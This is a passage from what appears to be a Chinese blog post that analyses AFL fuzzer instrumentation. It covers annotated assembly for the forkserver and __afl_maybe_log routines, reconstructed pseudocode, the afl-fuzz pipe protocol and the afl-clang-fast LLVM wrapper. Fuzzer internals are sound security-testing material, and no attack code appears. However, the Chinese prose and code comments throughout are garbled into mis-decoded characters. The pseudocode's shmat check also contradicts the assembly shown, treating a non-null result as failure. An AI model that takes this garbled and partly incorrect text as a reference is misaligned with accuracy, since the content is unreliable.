%rspæœ€åå››ä½æ¸…ç©ºå˜ä¸º0 ==&gt; æ ˆåœ°å€å¯¹é½åˆ°16å­—èŠ‚ï¼ˆåœ°å€æ˜¯16çš„æ•´æ•°å€ï¼‰<br><br>  leaq .AFL_SHM_ENV(%rip), %rdi# å°†å­—ç¬¦ä¸²"__AFL_SHM_ID"åœ°å€ä¿å­˜åˆ°%rdi<br>call getenv@PLT# è°ƒç”¨getenvï¼Œå³getenv("__AFL_SHM_ID")<br><br>  testq %rax, %rax# getenvè¿”å›å€¼å°†ç§»é€åˆ°$raxï¼Œè¿™é‡Œåˆ¤æ–­raxæ˜¯å¦ä¸º0ï¼Œå¦‚æœè¿”å›å€¼ä¸º0åˆ™è·³è½¬åˆ°__afl_setup_abort<br>  je    __afl_setup_abort<br><br>  movq  %rax, %rdi# å°†getenvè¿”å›çš„å­—ç¬¦ä¸²åœ°å€ç§»é€åˆ°%rdi(ç¬¬ä¸€ä¸ªå‚æ•°)<br>call atoi@PLT# è°ƒç”¨atoiå°†ç¯å¢ƒå˜é‡__AFL_SHM_IDçš„å€¼è½¬ä¸ºæ•´å‹ï¼Œè¿”å›çš„æ•´å‹å€¼ä¿å­˜åœ¨%raxä¸­<br><br>  xorq %rdx, %rdx   /* shmat flags    */<br>  xorq %rsi, %rsi   /* requested addr */<br>  movq %rax, %rdi   /* SHM ID         */<br>call shmat@PLT# è°ƒç”¨shmat(shmid --&gt; %rdi = %rax[atoiè¿”å›å€¼], shmaddr --&gt; %rsi = 0, shmflg --&gt; %rdx = 0)<br><br>  cmpq $-1, %rax# è¿”å› -1 è¡¨ç¤ºshmatè°ƒç”¨å¤±è´¥ï¼Œåˆ™è·³è½¬åˆ°__afl_setup_abort<br>  je   __afl_setup_abort<br><br>  /* Store the address of the SHM region. */<br><br>  movq %rax, %rdx# %raxä¿å­˜ç€è¿”å›çš„å…±äº«åœ°å€<br>  movq %rax, __afl_area_ptr(%rip)   # %raxä¿å­˜åˆ°__afl_area_ptrå˜é‡ä¸­<br><br>  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx  # __afl_global_area_ptræŒ‡é’ˆç§»é€åˆ°%rdx<br>  movq %rax, (%rdx)# å°†è¿”å›çš„å…±äº«åœ°å€ç§»é€åˆ°__afl_global_area_ptræŒ‡é’ˆæ‰€æŒ‡å‘çš„å€¼<br>  movq %rax, %rdx# å°†è¿”å›çš„åœ°å€ä¿å­˜åˆ°%rdxä¸­<br>  <br>__afl_forkserver:<br>  /* Enter the fork server mode to avoid the overhead of execve() calls. We<br>     push rdx (area ptr) twice to keep stack alignment neat. */<br><br>  pushq %rdx<br>  pushq %rdx<br><br>  /* Phone home and tell the parent that we're OK. (Note that signals with<br>     no SA_RESTART will mess it up). If this fails, assume that the fd is<br>     closed because we were execve()d from an instrumented binary, or because<br>     the parent doesn't want to use the fork server. */<br><br>  movq $4, %rdx               /* length    */<br>  leaq __afl_temp(%rip), %rsi /* data      */<br>  movq $(198 + 1), %rdi       /* file desc */<br>call write@PLT# è°ƒç”¨write(198, __afl_temp, 4)<br><br>  cmpq $4, %rax# è¿”å›å€¼ä¿å­˜åˆ°%raxä¸­ï¼Œå¦‚æœ%rax == 4ï¼Œè¡¨æ˜å†™å…¥æˆåŠŸ<br>  jne  __afl_fork_resume# å¦‚æœé€šä¿¡å¤±è´¥ï¼Œåˆ™è·³è½¬åˆ°__afl_fork_resume<br><br>__afl_fork_wait_loop:<br><br>  /* Wait for parent by reading from the pipe. Abort if read fails. */<br><br>  movq $4, %rdx               /* length    */<br>  leaq __afl_temp(%rip), %rsi /* data      */<br>  movq $198, %rdi             /* file desc */<br>call read@PLT# è°ƒç”¨read(198, __afl_temp, 4)<br>  cmpq $4, %rax# è¿”å›å€¼ä¿å­˜åˆ°%raxä¸­ï¼Œå¦‚æœ%rax == 4ï¼Œè¡¨æ˜è¯»å…¥æˆåŠŸ<br>  jne  __afl_die# å¦åˆ™è·³è½¬åˆ°__afl_dieä¸­<br><br>  /* Once woken up, create a clone of our process. This is an excellent use<br>     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly<br>     caches getpid() results and offers no way to update the value, breaking<br>     abort(), raise(), and a bunch of other things :-( */<br><br>call fork@PLT# è°ƒç”¨fork()<br>  cmpq $0, %rax# åˆ¤æ–­fork()çš„è¿”å›å€¼ (=0 ==&gt; å­è¿›ç¨‹ï¼Œ &lt;0 ==&gt; å¤±è´¥ï¼Œ &gt;0 ==&gt; åœ¨ä¸»è¿›ç¨‹ä¸­è¿”å›å­è¿›ç¨‹PID)<br>  jl   __afl_die# å¦‚æœ&lt;0(å¤±è´¥) åˆ™è·³è½¬åˆ°__afl_dieä¸­<br>  je   __afl_fork_resume# å¦‚æœ=0() ä½äºå­è¿›ç¨‹ä¸­ï¼Œåˆ™è·³è½¬åˆ°__afl_fork_resume<br><br>  /* In parent process: write PID to pipe, then wait for child. */<br><br>  movl %eax, __afl_fork_pid(%rip)# ã€è¯¥åˆ†æ”¯ä½äºçˆ¶è¿›ç¨‹ä¸­ã€‘ %eaxä¸ºfork()è¿”å›çš„å­è¿›ç¨‹PIDå€¼ï¼Œä¿å­˜åˆ°__afl_fork_pidä¸­<br><br>  movq $4, %rdx                   /* length    */<br>  leaq __afl_fork_pid(%rip), %rsi /* data      */<br>  movq $(198 + 1), %rdi             /* file desc */<br>call write@PLT# è°ƒç”¨write(199, &amp;__afl_fork_pid, 4);<br><br>  movq $0, %rdx                   /* no flags  */<br>  leaq __afl_temp(%rip), %rsi     /* status    */<br>  movq __afl_fork_pid(%rip), %rdi /* PID       */<br>call waitpid@PLT# è°ƒç”¨waitpid(__afl_fork_pid, __afl_temp, 0);<br>  cmpq $0, %rax# waitpid()è¿”å›å€¼è‹¥â‰¤0ï¼Œåˆ™è·³è½¬åˆ°__afl_die<br>  jle  __afl_die<br><br>  /* Relay wait status to pipe, then loop back. */<br><br>  movq $4, %rdx               /* length    */<br>  leaq __afl_temp(%rip), %rsi /* data      */<br>  movq $(198 + 1), %rdi         /* file desc */<br>call write@PLT# è°ƒç”¨write(199, &amp;__afl_temp, 4);<br><br>  jmp  __afl_fork_wait_loop# å›åˆ°å¾ªç¯é¦–<br>  <br>__afl_fork_resume:# è¯¥åˆ†æ”¯ä¸ºå­è¿›ç¨‹æ“ä½œ<br><br>  /* In child process: close fds, resume execution. */<br><br>  movq $198, %rdi<br>call close@PLT# è°ƒç”¨close(198)<br><br>  movq $(198 + 1), %rdi<br>call close@PLT# è°ƒç”¨close(199)<br>  # æ¢å¤ç°åœºï¼ï¼<br>  popq %rdx<br>  popq %rdx<br><br>  movq %r12, %rsp<br>  popq %r12<br><br>  movq  0(%rsp), %rax<br>  movq  8(%rsp), %rcx<br>  movq 16(%rsp), %rdi<br>  movq 32(%rsp), %rsi<br>  movq 40(%rsp), %r8<br>  movq 48(%rsp), %r9<br>  movq 56(%rsp), %r10<br>  movq 64(%rsp), %r11<br><br>  movq  96(%rsp), %xmm0<br>  movq 112(%rsp), %xmm1<br>  movq 128(%rsp), %xmm2<br>  movq 144(%rsp), %xmm3<br>  movq 160(%rsp), %xmm4<br>  movq 176(%rsp), %xmm5<br>  movq 192(%rsp), %xmm6<br>  movq 208(%rsp), %xmm7<br>  movq 224(%rsp), %xmm8<br>  movq 240(%rsp), %xmm9<br>  movq 256(%rsp), %xmm10<br>  movq 272(%rsp), %xmm11<br>  movq 288(%rsp), %xmm12<br>  movq 304(%rsp), %xmm13<br>  movq 320(%rsp), %xmm14<br>  movq 336(%rsp), %xmm15<br><br>  leaq 352(%rsp), %rsp<br><br>  jmp  __afl_store  # è·³è½¬åˆ°__afl_storeå»æ‰§è¡Œè¾¹çš„è®°å½•<br><br>__afl_die:<br><br>  xorq %rax, %rax<br>call _exit@PLT# è°ƒç”¨exit(0)<br></code></pre></td></tr></tbody></table></figure><ul><li><code>__afl_setup_abort</code>ï¼š</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__afl_setup_abort:<br><br>  /* Record setup failure so that we don't keep calling<br>     shmget() / shmat() over and over again. */<br><br>  incb __afl_setup_failure(%rip)  # __afl_setup_failure++;<br>  # æ¢å¤ç°åœº<br>  movq %r12, %rsp<br>  popq %r12<br><br>  movq  0(%rsp), %rax<br>  movq  8(%rsp), %rcx<br>  movq 16(%rsp), %rdi<br>  movq 32(%rsp), %rsi<br>  movq 40(%rsp), %r8<br>  movq 48(%rsp), %r9<br>  movq 56(%rsp), %r10<br>  movq 64(%rsp), %r11<br><br>  movq  96(%rsp), %xmm0<br>  movq 112(%rsp), %xmm1<br>  movq 128(%rsp), %xmm2<br>  movq 144(%rsp), %xmm3<br>  movq 160(%rsp), %xmm4<br>  movq 176(%rsp), %xmm5<br>  movq 192(%rsp), %xmm6<br>  movq 208(%rsp), %xmm7<br>  movq 224(%rsp), %xmm8<br>  movq 240(%rsp), %xmm9<br>  movq 256(%rsp), %xmm10<br>  movq 272(%rsp), %xmm11<br>  movq 288(%rsp), %xmm12<br>  movq 304(%rsp), %xmm13<br>  movq 320(%rsp), %xmm14<br>  movq 336(%rsp), %xmm15<br><br>  leaq 352(%rsp), %rsp<br><br>  jmp __afl_return<br><br></code></pre></td></tr></tbody></table></figure><p><code>__afl_maybe_log()</code>ä¼ªä»£ç ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64* __afl_area_ptr;<br>__int64 __afl_prev_loc;<br><span class="hljs-type">int</span> __afl_fork_pid;<br><span class="hljs-type">int</span> __afl_temp;<br>__int8 __afl_setup_failure;<br>__int64* __afl_global_area_ptr;<br><br><span class="hljs-type">void</span> _afl_maybe_log(__int64 random)<br>{<br>    <br>  __int64 flags;<br>  <span class="hljs-type">void</span>* shmaddr;<br>  <br>  v5 = v4;<br>  v6 = __afl_area_ptr;<br>  <span class="hljs-keyword">if</span> ( !__afl_area_ptr )<br>  {<br>    <span class="hljs-keyword">if</span> ( __afl_setup_failure )<br>      <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> ( __afl_global_area_ptr )<br>    {<br>      __afl_area_ptr = __afl_global_area_ptr;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-type">char</span>* id = getenv(<span class="hljs-string">"__AFL_SHM_ID"</span>);<br>      <span class="hljs-keyword">if</span> ( !id || __afl_area_ptr = shmat(atoi(id), shmaddr, flags) )<br>      {<br>        __afl_setup_failure++;<br>        <span class="hljs-keyword">return</span>;<br>      }<br>      __afl_global_area_ptr = __afl_area_ptr;<br>      <span class="hljs-keyword">if</span> ( write(<span class="hljs-number">199</span>, &amp;_afl_temp, <span class="hljs-number">4</span>) == <span class="hljs-number">4</span> )<br>      {<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        {<br>          <span class="hljs-type">int</span> pid = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> ( read(<span class="hljs-number">198</span>, &amp;_afl_temp, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span> )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">if</span> ( __afl_fork_pid = fork() &lt; <span class="hljs-number">0</span> )<br>             <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// é€€å‡º</span><br>          <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !__afl_fork_pid ){<br>            <span class="hljs-comment">// å­è¿›ç¨‹</span><br>            close(<span class="hljs-number">198</span>);  <span class="hljs-comment">// å…³é—­è¿™ä¸¤ä¸ªç®¡é“</span><br>      close(<span class="hljs-number">199</span>);<br>__afl_area_ptr[random ^ __afl_prev_loc]++;<br>            __afl_prev_loc = random &gt;&gt; <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span>;<br>          }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-comment">// çˆ¶è¿›ç¨‹ï¼ˆforkserverï¼‰</span><br>          write(<span class="hljs-number">199</span>, &amp;__afl_fork_pid, <span class="hljs-number">4</span>);  <span class="hljs-comment">// å°†pidå†™å…¥ç®¡é“? ä½œç”¨æ˜¯å•¥?</span><br>          <span class="hljs-keyword">if</span> ( waitpid(__afl_fork_pid, &amp;__afl_temp, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span> )<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// é€€å‡º</span><br>          write(<span class="hljs-number">199</span>, &amp;__afl_temp, <span class="hljs-number">4</span>);     <span class="hljs-comment">// è¿™é‡Œå°†__afl_tempå†™å›æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</span><br>          }<br>        }<br>      }<br>    }<br>  }<span class="hljs-keyword">else</span>{<br>      __afl_area_ptr[random ^ __afl_prev_loc]++;<br>      __afl_prev_loc = random &gt;&gt; <span class="hljs-number">1</span>;<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ä¸Šè¿°æ’æ¡©æ®‹ç•™ä¸€ä¸ªé—®é¢˜ï¼š</p><p>â€‹çˆ¶è¿›ç¨‹çš„ä¸»è¦ä½œç”¨æ˜¯ç»´æŒä¸€ä¸ª<code>fork-server</code>ï¼Œé‚£å®ƒä¸AFLä¹‹é—´é€šè¿‡ä¸€ä¸ªç®¡é“è¿›è¡Œé€šä¿¡ï¼Œä½†é€šä¿¡çš„å…·ä½“ç»†èŠ‚æ˜¯å•¥å‘¢ï¼Ÿ</p><h4 id="4-ä¸AFLé€šä¿¡"><a href="#4-ä¸AFLé€šä¿¡" class="headerlink" title="4. ä¸AFLé€šä¿¡"></a>4. ä¸AFLé€šä¿¡</h4><ul><li><p>åœ¨AFLä¸­ï¼Œ<code>afl-fuzz</code>ä¸­<code>init_forkserver()</code>æ˜¯åˆå§‹åŒ–forkserverçš„å‡½æ•°ï¼š</p><ul><li>åœ¨è¯¥å‡½æ•°ä¸­ï¼Œ<code>afl-fuzz</code>ä¼š<code>fork</code>å‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¹¶ä¸ºç®¡é“åˆ†é…æ–°çš„fdï¼ˆ198 ==&gt; æ§åˆ¶ç®¡é“<code>ctl_pipe[0]</code>ï¼Œ199 ==&gt; çŠ¶æ€ç®¡é“<code>st_pipe[0]</code>ï¼‰ã€‚è€Œè¿™ä¸ªå­è¿›ç¨‹<code>execv</code>ä¸€ä¸ªè¢«æµ‹ç¨‹åºï¼Œè¿™ä¸ªè¢«æµ‹ç¨‹åºï¼ˆi.e. fork-serverï¼‰åœ¨è°ƒç”¨ç¬¬ä¸€ä¸ª<code>__afl_maybe_log()</code>å‡½æ•°æ—¶ï¼Œé¦–å…ˆä¼šå‘çŠ¶æ€ç®¡é“å†™å…¥4å­—èŠ‚çš„ä»»æ„æ•°æ®ï¼Œç„¶åå°†åœ¨whileå¾ªç¯ä¸­çš„ç¬¬ä¸€ä¸ª<code>read(198, &amp;_afl_temp, 4)</code>å¤„é˜»å¡ï¼Œç­‰å¾…<code>AFL-fuzzer</code>å‘æ¥ä¿¡æ¯ï¼›</li><li>è€Œåœ¨<code>afl-fuzz</code>çˆ¶è¿›ç¨‹ä¸­ï¼Œé€šè¿‡è¯»å–çŠ¶æ€ç®¡é“4å­—èŠ‚çš„æ•°æ®æ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸå¯ç”¨<code>fork-server</code></li></ul></li><li><p>åœ¨AFLä¸­ï¼Œ<code>run_target()</code>å°†é€šçŸ¥<code>fork-server</code>å‡ºä¸€ä¸ªæ–°çš„å­è¿›ç¨‹æ¥è·‘æ¨¡ç³Šæµ‹è¯•ç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹ï¼š</p><ul><li><code>afl-fuzz</code>è¿›ç¨‹å°†4ä¸ªå­—èŠ‚çš„è¶…æ—¶æ—¶é—´å†™å…¥åˆ°æ§åˆ¶ç®¡é“</li><li><code>fork-server</code>åœ¨è¯»å–åˆ°4ä¸ªå­—èŠ‚ï¼ˆ0ï¼‰ä¹‹åï¼Œå°†åœæ­¢é˜»å¡ã€‚ç„¶å<code>fork()</code>å‡ºä¸€ä¸ªæ–°çš„å­è¿›ç¨‹æ¥è·‘å®é™…çš„è¢«æµ‹ç›®æ ‡ï¼Œ<code>pid</code>å°†é€šè¿‡çŠ¶æ€ç®¡é“é€å›ç»™<code>afl-fuzzer</code>ï¼Œç„¶åæ”¶é›†è¦†ç›–ç‡ä¿¡æ¯ã€‚è¿™é‡Œ<code>fork-server</code>å°†è¿™è¯»å…¥çš„å››å­—èŠ‚0ç”¨äº<code>waitpid()</code>çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œç„¶åç­‰å¾…å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ã€‚å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œ<code>fork-server</code>å†å‘çŠ¶æ€ç®¡é“å†™å…¥4å­—èŠ‚ï¼Œè¡¨æ˜è¢«æµ‹ç¨‹åºæ‰§è¡Œå®Œæ¯•</li><li><code>afl-fuzz</code>æ ¹æ®<code>fork</code>å‡ºæ¥çš„è¢«æµ‹ç¨‹åº<code>pid</code>çš„ç»“æŸä¿¡å·å’Œè¦†ç›–ç‡ä¿¡æ¯åšè¿›ä¸€æ­¥çš„åˆ†æå¤„ç†</li></ul></li><li><p>æµç¨‹å›¾å¦‚ä¸‹æ‰€ç¤ºã€‚å…¶ä¸­ â‘ â†’â‘¡â†’â‘¢ ä¸ºåˆ›å»º<code>fork-server</code>çš„è¿‡ç¨‹ï¼Œâ‘£â†’â‘¤â†’â‘¥â†’â‘¦â†’â‘§â†’â‘¨ ä¸ºä¸€æ¬¡å®Œæ•´çš„<code>run_target()</code>çš„è¿‡ç¨‹ã€‚</p></li></ul><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/13.png"></p><center name="pic13">å›¾13 AFLä¸fork-serveré€šä¿¡æµç¨‹å›¾</center><h3 id="b-åŸºäºLLVMçš„æ’æ¡©"><a href="#b-åŸºäºLLVMçš„æ’æ¡©" class="headerlink" title="b. åŸºäºLLVMçš„æ’æ¡©"></a>b. åŸºäºLLVMçš„æ’æ¡©</h3><ul><li>afl-clang-fastã€afl-clang-fast++</li><li>åŸºäºLLVM <strong>Pass</strong>å®ç°</li></ul><h4 id="1-afl-clang-fast-c"><a href="#1-afl-clang-fast-c" class="headerlink" title="1. afl-clang-fast.c"></a>1. afl-clang-fast.c</h4><ul><li><p>æ˜¯clangå’Œclang++çš„ä¸€ä¸ªwrapperï¼Œæ ¹æ®å…·ä½“è°ƒç”¨çš„afl-clang-fast(++)æ¥åŒºåˆ†</p><ul><li>afl-clang-fast++æ˜¯afl-clang-fastçš„ä¸€ä¸ªè½¯é“¾æ¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ll afl-clang-fast afl-clang-fast++<br>-rwxrwxr-x 1 chan chan 24608 Nov 28 18:36 afl-clang-fast*<br>lrwxrwxrwx 1 chan chan    14 Nov 28 18:36 afl-clang-fast++ -&gt; afl-clang-fast*<br></code></pre></td></tr></tbody></table></figure></li><li><p>ä¸<strong>llvm Pass</strong>ï¼ˆ<code>afl-llvm-pass.so</code>ï¼‰ç»“åˆä½¿ç”¨ï¼šä½¿ç”¨<code>-Xclang</code>è®©clangè¿è¡Œç”¨æˆ·è‡ªå®šä¹‰çš„<strong>Pass</strong></p><ul><li>ä¸<code>afl-gcc</code>çš„åŒºåˆ«ï¼šPassåœ¨<strong>ç¼–è¯‘å™¨è¿è¡Œæ—¶</strong>è¿›è¡Œæ’æ¡©ï¼Œè€Œ<code>afl-gcc</code>å¯¹<strong>ç¼–è¯‘å™¨è¿è¡Œç»“æŸå</strong>ç”Ÿæˆçš„æ±‡ç¼–æ–‡ä»¶è¿›è¡Œæ’æ¡©</li></ul></li><li><p><strong>æºç è§£æ</strong>ï¼š</p><ul><li><p><code>find_obj()</code>ï¼šå¯»æ‰¾<code>afl-llvm-rt.o</code>ç›®æ ‡æ–‡ä»¶ï¼Œå¹¶å°†AFLè·¯å¾„ä¿å­˜åˆ°<code>obj_path</code>å˜é‡ä¸­</p></li><li><p><code>edit_params()</code>ï¼šæ„é€ æ–°çš„ç¼–è¯‘å‘½ä»¤è¡Œé€‰é¡¹<code>cc_params</code>ï¼Œå°†<code>argv</code>ä¸­çš„é€‰é¡¹æ‹·è´åˆ°<code>cc_params</code>ä¸­ï¼ŒåŒæ—¶æä¾›ä¸€äº›å¿…è¦çš„ç¼–è¾‘ï¼š</p><ul><li><p>é¦–å…ˆå¯¹<code>argv[0]</code>è¿›è¡ŒåŒ¹é…ï¼Œå³è¿›è¡Œåˆ†æµï¼š</p><p><code>afl-clang-fast++</code> =&gt; <code>clang++</code></p><p><code>afl-clang-fast</code> =&gt; <code>clang</code></p></li><li><p>å¦‚æœä½¿ç”¨<code>trace_pc</code>æ¨¡å¼ï¼Œåˆ™åœ¨<code>cc_params</code>åè¿½åŠ <code>-fsanitize-coverage=trace-pc-guard</code>ï¼›å¦åˆ™è¿½åŠ ä¸¤ä¸ªé€‰é¡¹ï¼š<code>-Xclang -load</code>ï¼ˆåŠ è½½åŒ…å«æ’ä»¶æ³¨å†Œè¡¨çš„åŠ¨æ€åº“ï¼‰å’Œ<code>-Xclang obj_path/afl-llvm-pass.so</code>ã€‚æ­¤å¤–ï¼Œè¿˜è¦é¢å¤–è¿½åŠ ä¸€ä¸ª<code>-Qunused-arguments</code> [20] é€‰é¡¹æ¥é™é»˜å…³äºæœªä½¿ç”¨å‚æ•°çš„è­¦å‘Šã€‚</p></li><li><p>å°†<code>argv[]</code>ä¸­å…¶ä»–çš„é€‰é¡¹æ‹·è´åˆ°<code>cc_params</code>ï¼Œåœ¨æ­¤æœŸé—´å°†æ›´æ–°ä¸€äº›å˜é‡å€¼</p></li></ul><table><thead><tr><th>é€‰é¡¹</th><th>å˜é‡</th></tr></thead><tbody><tr><td>-m32ã€armv7a-linux-androideabi</td><td>bit_mode = 32</td></tr><tr><td>-m64</td><td>bit_mode = 64</td></tr><tr><td>-x &lt;language&gt; (å°†è¾“å…¥æ–‡ä»¶è¯•ä¸ºæŸä¸€è¯­è¨€çš„æ–‡ä»¶)</td><td>x_set = 1 ==&gt; â€œ-x noneâ€</td></tr><tr><td>-fsanitize=addressã€-fsanitize=memory</td><td>asan_set = 1</td></tr><tr><td>FORTIFY_SOURCE</td><td>fortify_set = 1</td></tr><tr><td>-Wl,-z,defs</td><td>ä¸è¿½åŠ åˆ°<code>cc_params</code>ä¸­</td></tr><tr><td>-Wl,â€“no-undefined</td><td>ä¸è¿½åŠ åˆ°<code>cc_params</code>ä¸­</td></tr></tbody></table><ul><li>åé¢è¿½åŠ çš„ä¸€äº›é€‰é¡¹ä¸<code>afl-gcc</code>ç›¸ä¼¼ï¼Œä¸å†èµ˜è¿°ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½¿ç”¨äº†<code>trace pc</code>æ¨¡å¼ï¼Œ<code>AFL_INST_RATIO</code>å°†ä¸å¯ä½¿ç”¨ã€‚<code>afl-clang-fast</code>ä½¿ç”¨<code>-D</code>é€‰é¡¹å‘<code>cc_params</code>è¿½åŠ äº†ä¸€äº›éšå¼çš„<code>#define</code>ï¼Œåˆ†åˆ«æ˜¯ï¼š</li></ul><table><thead><tr><th>å€¼</th></tr></thead><tbody><tr><td>__AFL_HAVE_MANUAL_CONTROL=1</td></tr><tr><td>__AFL_COMPILER=1</td></tr><tr><td>FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</td></tr><tr><td>__AFL_LOOP(_A)=({ static volatile char *_B __attribute__((used)); _B = (char*) â€œ##SIG_AFL_PERSISTENT##â€; __attribute__((visibility("default"))) int _L(unsigned int) __asm__("__afl_persistent_loop"); _L(_A); })</td></tr><tr><td>__AFL_INIT()=do  { static volatile char *_A __attribute__((used));   _A = (char*) â€œ##SIG_AFL_DEFER_FORKSRV##â€; __attribute__((visibility("default")))  void _I(void) __asm__("__afl_manual_init"); _I(); } while (0)</td></tr></tbody></table><ul><li>æœ€åï¼Œæ ¹æ®<code>bit_mode</code>å‘<code>cc_params</code>åè¿½åŠ å¯¹åº”çš„ç›®æ ‡æ–‡ä»¶ [ é»˜è®¤ä¸º <code>afl-llvm-rt.o</code>ï¼Œ32ä½ <code>afl-llvm-rt-32.o</code>ï¼Œ64ä½ <code>afl-llvm-rt-64.o</code> ]</li></ul></li><li><p><code>execvp()</code>ï¼šæ‰§è¡Œæ„é€ çš„å‘½ä»¤è¡Œï¼Œå³<code>cc_params</code>ã€‚è¯¥å‘½ä»¤è¡Œé€šè¿‡<code>-Xclang</code>è¿è¡Œ<strong>Pass</strong>ï¼Œç„¶åå°†<code>afl-llvm-rt.o</code>ç›®æ ‡æ–‡ä»¶é“¾æ¥åˆ°æœ€ç»ˆç”Ÿæˆçš„<code>afl-clang-fast</code>ã€‚</p><p><span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œ<code>afl-llvm-pass.so.cc</code>çš„ä½œç”¨æ˜¾è€Œæ˜“è§ï¼Œå°±æ˜¯æ„é€ æ‰§è¡Œ<strong>Pass</strong>æ’æ¡©çš„åŠ¨æ€é“¾æ¥åº“ï¼Œä½†ç›®æ ‡æ–‡ä»¶<code>afl-llvm-rt.o</code>çš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p></li></ul></li></ul><h4 id="2-afl-llvm-pass-so-cc"><a href="#2-afl-llvm-pass-so-cc" class="headerlink" title="2. afl-llvm-pass.so.cc"></a>2. afl-llvm-pass.so.cc</h4><ul><li><p>ç”Ÿæˆæ‰§è¡Œæ’æ¡©<strong>Pass</strong>çš„åŠ¨æ€é“¾æ¥åº“</p></li><li><p><code>AFLCoverage::runOnModule</code>ï¼šç”¨äºæ‰§è¡Œè½¬æ¢ï¼ˆæ’æ¡©ï¼‰</p><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> åˆ›å»ºä¸¤ä¸ªå…¨å±€å˜é‡ï¼š</p><p><code>__afl_area_ptr</code> ç”¨äºä¿å­˜å…±äº«å†…å­˜åŒºåŸŸçš„åœ°å€ï¼›<code>__afl_prev_loc</code>ç”¨äºå­˜æ”¾å‰ä¸€ä¸ªåŸºæœ¬å—IDå³ç§»ä¸€ä½çš„å€¼</p><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" 